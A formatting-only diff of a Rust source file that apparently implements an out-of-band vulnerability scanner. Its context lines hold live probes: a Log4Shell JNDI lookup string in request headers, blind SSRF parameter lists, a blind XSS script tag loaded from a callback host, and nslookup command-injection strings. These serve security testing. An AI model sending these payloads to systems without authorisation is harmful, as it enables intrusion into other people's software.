@@ -120,12 +120,7 @@ async fn poll_token(client: &reqwest::Client, token: &str) -> bool {
 }
 
 /// Plant Log4Shell JNDI probes in common log-injection headers.
-async fn plant_log4shell(
-    client: &reqwest::Client,
-    base: &str,
-    _token: &str,
-    embed: &str,
-) -> bool {
+async fn plant_log4shell(client: &reqwest::Client, base: &str, _token: &str, embed: &str) -> bool {
     let jndi = format!("${{jndi:ldap://{embed}}}");
     let headers = [
         "User-Agent",
@@ -157,10 +152,45 @@ async fn plant_log4shell(
 /// Blind SSRF via common URL parameters.
 async fn plant_blind_ssrf(client: &reqwest::Client, base: &str, embed: &str) -> bool {
     let params = [
-        "url", "uri", "path", "dest", "redirect", "callback", "webhook", "fetch", "src", "source",
-        "target", "link", "goto", "next", "return", "continue", "ref", "site", "feed", "host",
-        "domain", "endpoint", "proxy", "load", "request", "file", "document", "page", "to", "out",
-        "view", "dir", "show", "navigation", "open", "img", "image", "picture", "avatar",
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "callback",
+        "webhook",
+        "fetch",
+        "src",
+        "source",
+        "target",
+        "link",
+        "goto",
+        "next",
+        "return",
+        "continue",
+        "ref",
+        "site",
+        "feed",
+        "host",
+        "domain",
+        "endpoint",
+        "proxy",
+        "load",
+        "request",
+        "file",
+        "document",
+        "page",
+        "to",
+        "out",
+        "view",
+        "dir",
+        "show",
+        "navigation",
+        "open",
+        "img",
+        "image",
+        "picture",
+        "avatar",
     ];
     let base_trim = base.trim_end_matches('/');
     let mut sent = false;
@@ -177,7 +207,9 @@ async fn plant_blind_ssrf(client: &reqwest::Client, base: &str, embed: &str) -> 
 async fn plant_blind_xss(client: &reqwest::Client, base: &str, embed: &str) -> bool {
     let payload = format!(r#"""><script src="{embed}"></script>"#);
     let enc = urlencode(&payload);
-    let params = ["q", "search", "query", "s", "keyword", "name", "comment", "message", "text"];
+    let params = [
+        "q", "search", "query", "s", "keyword", "name", "comment", "message", "text",
+    ];
     let base_trim = base.trim_end_matches('/');
     let mut sent = false;
     for p in params {
@@ -230,7 +262,9 @@ async fn plant_cmd_dns(client: &reqwest::Client, base: &str, token: &str, domain
         format!("$(nslookup {token}.{domain})"),
         format!("&nslookup {token}.{domain}&"),
     ];
-    let params = ["cmd", "exec", "command", "run", "ping", "host", "ip", "addr", "target"];
+    let params = [
+        "cmd", "exec", "command", "run", "ping", "host", "ip", "addr", "target",
+    ];
     let base_trim = base.trim_end_matches('/');
     let mut sent = false;
     for p in params {
@@ -274,9 +308,8 @@ async fn plant_all_channels(base: &str, domain: &str) -> Vec<PlantedProbe> {
 
     for ch in CHANNELS {
         let token = Uuid::new_v4().as_hyphenated().to_string();
-        let embed = crate::fuzz_oob::oast_embed_url_for_token(&token).unwrap_or_else(|| {
-            format!("http://{token}.{domain}/i")
-        });
+        let embed = crate::fuzz_oob::oast_embed_url_for_token(&token)
+            .unwrap_or_else(|| format!("http://{token}.{domain}/i"));
 
         let sent = match ch.id {
             "log4shell" => plant_log4shell(&client, base, &token, &embed).await,
@@ -301,10 +334,7 @@ async fn plant_all_channels(base: &str, domain: &str) -> Vec<PlantedProbe> {
 }
 
 fn channel_meta(id: &str) -> &'static ProbeChannel {
-    CHANNELS
-        .iter()
-        .find(|c| c.id == id)
-        .unwrap_or(&CHANNELS[0])
+    CHANNELS.iter().find(|c| c.id == id).unwrap_or(&CHANNELS[0])
 }
 
 fn posture_summary(
@@ -370,7 +400,10 @@ pub async fn run_oast_oob_result(target: &str) -> EngineResult {
             }),
         )];
         findings.push(posture_summary(target, &host, false, 0, 0, &domain));
-        return EngineResult::ok(findings, format!("{ENGINE_ID}: OAST not configured on {host}"));
+        return EngineResult::ok(
+            findings,
+            format!("{ENGINE_ID}: OAST not configured on {host}"),
+        );
     }
 
     let planted = plant_all_channels(&base, &domain).await;
